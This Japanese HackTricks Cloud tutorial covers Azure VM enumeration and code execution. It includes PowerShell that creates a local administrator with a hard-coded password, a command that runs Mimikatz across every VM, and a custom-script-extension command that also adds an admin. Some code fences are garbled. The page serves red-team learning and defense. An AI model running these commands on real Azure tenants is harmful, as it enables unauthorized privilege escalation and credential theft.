# Az - 仮想マシン & ネットワーク

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSのハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>

## 基本情報

Azureの仮想マシンは、Azureが提供する[オンデマンドでスケーラブルなコンピューティングリソース](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree)のいくつかのタイプの1つです。通常、他の選択肢よりもコンピューティング環境をより制御したい場合に仮想マシンを選択します。この記事では、仮想マシンを作成する前に考慮すべきこと、作成方法、および管理方法についての情報を提供します。

## Azure ネットワーク情報

Azureネットワークには**異なるエンティティと設定方法が含まれています。** Azureネットワークエンティティの簡単な**説明**、**例**、および**列挙**コマンドは以下で見つけることができます:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion**は、SSL経由でAzureポータル内の**仮想マシンに対して安全でシームレスなRDP**（Remote Desktop Protocol）および**SSH**（Secure Shell）**アクセス**を提供する完全に管理されたサービスです。このサービスは、**仮想マシンを公開インターネット接続にさらす代わりに**、より安全で便利な**代替手段**です。Azure Bastionは、Azure Virtual Network内にプロビジョニングされ、プライベートIPアドレスを使用してVNet内のすべてのVMにRDPおよびSSH接続を提供します。つまり、Azure VMにパブリックIPアドレスを割り当てる必要はありません。

したがって、会社が開発とテストのためにAzure VNet内にいくつかのVMをホストしている場合、**パブリックIPアドレスを設定し、RDPまたはSSHアクセスを有効にするために各VMのNSGルールを管理する代わりに**、**Azure Bastionをデプロイします**。Azure Bastionを使用すると、開発者やIT担当者は、パブリックIPアドレスを必要とせずに、安全にWebブラウザを使用してAzureポータルからこれらのVMに**アクセス**することができます。

サブスクリプション内のすべてのAzure Bastionホストをリストするには、次のコマンドを使用できます:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
```
{% endcode %}

## VM 列挙
```
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **VMでコマンドを実行する**

### **VMでのAADログイン**

AzureADで認証されたユーザーにアクセスを許可することが可能です。例えば、**linux VM**へのアクセスを試みる場合: `ssh username@azure-corp.com@1.1.1.1` (ログインを試みる際に使用されるazurecorpの**メールアドレスを使用する**ことが重要です)、次のようなエラーが発生する可能性があります:

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

これらの**指示に従って** [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) にアクセスし、コードを指定して、メールアドレスとパスワードを認証情報として使用すると、SSH経由で接続できます（そのユーザーに十分な権限がある場合: `Virtual Machine Administrator Login` または `Virtual Machine User Login` ロール）。

### **Run Command**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Run Custom Script Extension（カスタムスクリプト拡張を実行する）**

Azure virtual machine (VM) 拡張機能は、**Azure VM上で**の展開後の設定と自動化**タスク**を提供する**小規模アプリケーション**です。例えば、仮想マシンにソフトウェアのインストール、アンチウイルス保護、またはスクリプトを実行する機能が必要な場合、VM拡張機能を使用できます。

したがって、書き込み権限がある場合、任意のコードを実行できます：
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState

**DesiredConfigurationState (DSC)** はAnsibleに似ていますが、PowerShell内のツールで、コードを通じてホストを設定することができます。DSCにはAzureにその拡張機能があり、**設定ファイル**のアップロードが可能です。DSCの[設定ファイル](https://docs.microsoft.com/en-us/powershell/dsc/getting-started/wingettingstarted?view=dsc-1.1#define-a-configuration-and-generate-the-configuration-document)は構文に非常に厳しいですが、DSC拡張機能は非常に騙されやすく、ある特定の形式に従っていれば、図5に示すように、**どんなコマンドでも盲目的に実行します**。

<figure><img src="../../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

これは、**Az PowerShell** 関数 [**`Publish-AzvmdscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) を通じて行うことができます。DSC拡張機能は、**.PS1** ファイルに**関数**が含まれ、**.zip** ファイルに**パッケージ化**されていることを要求します。これは実際には正しいDSC構文ではないため、拡張機能のステータスは「失敗」と表示されますが、コードは実行されます。この問題は、コマンドの出力がなく、ステータスが失敗メッセージで上書きされるためです。

### VM Application Definitions

[VM Applications](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications) リソースは、Azure VMに**バージョン管理されたアプリケーションを繰り返しデプロイする**方法です。例えば、**プログラム**を作成し、すべてのAzure VMにバージョン1.0として**デプロイ**した場合、プログラムを**1.1に更新**すると、同じVMアプリケーションを使用して**別の定義を作成し**、任意のVMに更新をプッシュできます。\
VMに**アプリケーションをプッシュする**ことができるということは、**コード実行**のための別の手段であることを意味します。この方法の欠点は、アプリケーション定義の設定に[**いくつかの手順が必要**](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=portal)ですが、Az PowerShellの**`New-AzGalleryApplication`** および **`New-AzGalleryApplicationVersion`** コマンドレットを使用して達成できます。

この技術は、**拡張機能 "VMAppExtension"** を利用して動作し、VMにアプリケーションを適用すると自動的にインストールされます。拡張機能はURIからファイルをディスクにダウンロードし、アプリケーションの名前と_正確に_同じ名前で保存します。つまり、アプリケーション名が 'AzApplication' の場合、ディスク上のファイルも拡張子なしで 'AzApplication' と呼ばれます。これには、[REST APIコール](https://docs.microsoft.com/en-us/rest/api/compute/gallery-application-versions/create-or-update)の "ManageActions" フィールドを適切な拡張子でアプリケーションをリネームするように設定する必要があります。完全なアプリケーションを実行したくない場合は、同じREST APIメソッドのManageActionsフィールドを悪用するか、Azure Portalを通じて任意のPowerShellコマンドを実行することもできます。設定が完了すると、定義は図8のようになります。

<figure><img src="../../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

この実行技術は残念ながら遅いです（アプリまたはコマンドを実行するのに約3-4分かかります）が、比較的新しいため、特定の検出が書かれているとは思われません。

実行を最終的に行うのが拡張機能であるため、アプリケーションのコピーは `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` にあり、実行のステータスは `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` に保持されます。

### Hybrid Worker Groups

[**Hybrid Worker Groups**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) (HWGs) は、設定された**Runbook**を**設定されたHWG**の一部である**Azure Virtual machine**上で**実行**することを可能にします。再び、RunbookコードをVMにデプロイするためにVM上で**拡張機能が使用されます**。拡張機能が使用されるため、資格情報は関係なく、コードは**SYSTEM**またはrootとして実行されます。

<figure><img src="../../../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>

Windows 10 VMを使用する場合は、デフォルトではVMに7.1がインストールされていないため、RunbookがPowerShellバージョン5.1として実行されるようにすることが重要です。

## 参考文献

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>AWSのハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。

</details>
